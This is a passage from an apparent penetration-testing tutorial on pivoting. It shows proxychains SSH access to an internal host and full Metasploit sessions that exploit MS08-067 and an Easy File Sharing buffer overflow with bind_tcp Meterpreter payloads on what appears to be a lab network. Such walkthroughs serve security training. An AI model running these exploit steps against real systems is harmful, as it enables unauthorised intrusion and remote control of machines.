class="enlighter-text">:</span><span class="enlighter-n1">32</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Favorites</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">18</span><span class="enlighter-text">:</span><span class="enlighter-n1">38</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Start Menu</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">21</span><span class="enlighter-text">:</span><span class="enlighter-n1">32</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Templates</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-n1">0</span><span class="enlighter-text"> Files                  </span><span class="enlighter-n1">0</span><span class="enlighter-text"> bytes</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-n1">7</span><span class="enlighter-text"> Directories</span></div></div><div class=""><div><span class="enlighter-text">bvshell:/C/Documents and Settings/All Users$</span></div></div></div><div class="enlighter-raw">root@kali:~# proxychains ssh admin@7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.
ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.
admin@7.7.7.20's password: 



bvshell:/C/Documents and Settings/All Users$ pwd
/C/Documents and Settings/All Users
bvshell:/C/Documents and Settings/All Users$ dir
2016-12-24  21:32          &lt;DIR&gt; Application Data
2016-12-25  06:16          &lt;DIR&gt; Desktop
2016-12-24  18:36          &lt;DIR&gt; Documents
2016-12-24  18:37          &lt;DIR&gt; DRM
2016-12-24  21:32          &lt;DIR&gt; Favorites
2016-12-24  18:38          &lt;DIR&gt; Start Menu
2016-12-24  21:32          &lt;DIR&gt; Templates
      0 Files                  0 bytes
      7 Directories
bvshell:/C/Documents and Settings/All Users$</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">root@kali:~#&nbsp;proxychains&nbsp;ssh&nbsp;admin@7.7.7.20
ProxyChains-3.1&nbsp;(http://proxychains.sf.net)
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;'7.7.7.20&nbsp;(7.7.7.20)'&nbsp;can't&nbsp;be&nbsp;established.
ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?&nbsp;yes
Warning:&nbsp;Permanently&nbsp;added&nbsp;'7.7.7.20'&nbsp;(ECDSA)&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.
admin@7.7.7.20's&nbsp;password:&nbsp;



bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$&nbsp;pwd
/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users
bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$&nbsp;dir
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Application&nbsp;Data
2016-12-25&nbsp;&nbsp;06:16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Desktop
2016-12-24&nbsp;&nbsp;18:36&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Documents
2016-12-24&nbsp;&nbsp;18:37&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;DRM
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Favorites
2016-12-24&nbsp;&nbsp;18:38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Start&nbsp;Menu
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Templates
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Files&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;Directories
bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$</pre>
<h3>Gaining Access to the Second Pivot</h3>
<p>If you remember, there were two vulnerabilities in our nmap scan on the 7.7.7.0/24 network range. These weaknesses were MS08-067 and <strong>BoF</strong> vulnerability in Easy File Share application. Access to the target system can be achieved in both ways. Another option is to continue with the SSH access, but&nbsp;we&nbsp;will continue through MS08-067 and Easy File Share.</p>
<h4>MS08-067 with Bind TCP</h4>
<p>The module with the full path <strong>exploit/windows/smb/ms08_067_netapi</strong> available in the Metasploit Framework can be used to compromise&nbsp;the target system via MS08-067 vulnerability. The important point here is that <strong>bind_tcp</strong> is selected as the payload type. Since the double-sided routing is not defined, the target system will not be able to directly reach us. For this reason, it is necessary to select the Bind TCP payload&nbsp;type so that the target should wait for a connection on its own port. After the successful exploit operation, the connection to the port where the target system is listening will be performed.</p>
<p>How Reverse TCP and Bind TCP connections work can be examined through the following visuals.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-581" src="https://pentest.blog/wp-content/uploads/reverse_bind-2.png" alt="" width="513" height="352" srcset="https://pentest.blog/wp-content/uploads/reverse_bind-2.png 513w, https://pentest.blog/wp-content/uploads/reverse_bind-2-300x206.png 300w" sizes="(max-width: 513px) 100vw, 513px"></p>
<p>Setting up the MS08-067-Netapi exploit module with the Bind TCP payload and compromise&nbsp;the target:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use exploit/windows/smb/ms08_067_netapi </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">exploit/windows/smb/ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name     Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----     ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   RHOST                     yes       The target address</span></div></div><div class=""><div><span class="enlighter-text">   RPORT    </span><span class="enlighter-n1">445</span><span class="enlighter-text">              yes       The SMB service port</span></div></div><div class=""><div><span class="enlighter-text">   SMBPIPE  BROWSER          yes       The pipe name to </span><span class="enlighter-m0">use</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">BROWSER, SRVSVC</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Exploit target:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Id  Name</span></div></div><div class=""><div><span class="enlighter-text">   --  ----</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">0</span><span class="enlighter-text">   Automatic Targeting</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set rhost </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">rhost =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set payload windows/meterpreter/bind_tcp</span></div></div><div class=""><div><span class="enlighter-text">payload =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> windows/meterpreter/bind_tcp</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">exploit/windows/smb/ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name     Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----     ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   RHOST    </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">         yes       The target address</span></div></div><div class=""><div><span class="enlighter-text">   RPORT    </span><span class="enlighter-n1">445</span><span class="enlighter-text">              yes       The SMB service port</span></div></div><div class=""><div><span class="enlighter-text">   SMBPIPE  BROWSER          yes       The pipe name to </span><span class="enlighter-m0">use</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">BROWSER, SRVSVC</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Payload </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">windows/meterpreter/bind_tcp</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name      Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----      ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   EXITFUNC  thread           yes       Exit </span><span class="enlighter-m0">technique</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">Accepted: </span><span class="enlighter-s0">''</span><span class="enlighter-text">, seh, thread, process, none</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   LPORT     </span><span class="enlighter-n1">4444</span><span class="enlighter-text">             yes       The listen port</span></div></div><div class=""><div><span class="enlighter-text">   RHOST     </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">         no        The target address</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Exploit target:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Id  Name</span></div></div><div class=""><div><span class="enlighter-text">   --  ----</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">0</span><span class="enlighter-text">   Automatic Targeting</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Started bind handler</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text"> - Automatically detecting the target...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text"> - Fingerprint: Windows </span><span class="enlighter-n1">2003</span><span class="enlighter-text"> - Service Pack </span><span class="enlighter-n1">2</span><span class="enlighter-text"> - lang:Unknown</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text"> - We could not detect the language pack, defaulting to English</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text"> - Selected Target: Windows </span><span class="enlighter-n1">2003</span><span class="enlighter-text"> SP2 </span><span class="enlighter-m0">English</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">NX</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">445</span><span class="enlighter-text"> - Attempting to trigger the vulnerability...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Sending </span><span class="enlighter-m0">stage</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">957999</span><span class="enlighter-text"> bytes</span><span class="enlighter-g1">)</span><span class="enlighter-text"> to </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Meterpreter session </span><span class="enlighter-n1">2</span><span class="enlighter-text"> </span><span class="enlighter-m0">opened</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">-</span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text">:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> -</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">4444</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">msf &gt; use exploit/windows/smb/ms08_067_netapi 

msf exploit(ms08_067_netapi) &gt; show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       The SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



msf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20
rhost =&gt; 7.7.7.20

msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp

msf exploit(ms08_067_netapi) &gt; show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    7.7.7.20         yes       The target address
   RPORT    445              yes       The SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     7.7.7.20         no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



msf exploit(ms08_067_netapi) &gt; run

[*] Started bind handler
[*] 7.7.7.20:445 - Automatically detecting the target...
[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English
[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)
[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...
[*] Sending stage (957999 bytes) to 7.7.7.20
[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) 


meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">msf &gt; use exploit/windows/smb/ms08_067_netapi 

msf exploit(ms08_067_netapi) &gt; show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       The SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



msf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20
rhost =&gt; 7.7.7.20

msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp

msf exploit(ms08_067_netapi) &gt; show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    7.7.7.20         yes       The target address
   RPORT    445              yes       The SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     7.7.7.20         no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



msf exploit(ms08_067_netapi) &gt; run

[*] Started bind handler
[*] 7.7.7.20:445 - Automatically detecting the target...
[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English
[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)
[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...
[*] Sending stage (957999 bytes) to 7.7.7.20
[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) 


meterpreter &gt;</pre>
<h4>Easy File Share BoF</h4>
<p>Another vulnerability&nbsp;was the Easy File Share application. Setting the exploit module with the Bind TCP payload and compromise&nbsp;the target can be accomplished with the following steps:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf  </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use exploit/windows/http/easyfilesharing_seh </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">easyfilesharing_seh</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">exploit/windows/http/easyfilesharing_seh</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name   Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----   ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   RHOST                   yes       The target address</span></div></div><div class=""><div><span class="enlighter-text">   RPORT  </span><span class="enlighter-n1">80</span><span class="enlighter-text">               yes       The target port</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Exploit target:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Id  Name</span></div></div><div class=""><div><span class="enlighter-text">   --  ----</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">0</span><span class="enlighter-text">   Easy File Sharing </span><span class="enlighter-n0">7.2</span><span class="enlighter-text"> HTTP</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">easyfilesharing_seh</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set rhost </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">rhost =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">easyfilesharing_seh</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set payload windows/meterpreter/bind_tcp</span></div></div><div class=""><div><span class="enlighter-text">payload =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> windows/meterpreter/bind_tcp</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">easyfilesharing_seh</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Started bind handler</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text"> - </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text"> - Sending exploit...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text"> - Exploit Sent</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Sending </span><span class="enlighter-m0">stage</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">957999</span><span class="enlighter-text"> bytes</span><span class="enlighter-g1">)</span><span class="enlighter-text"> to </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Meterpreter session </span><span class="enlighter-n1">2</span><span class="enlighter-text"> </span><span 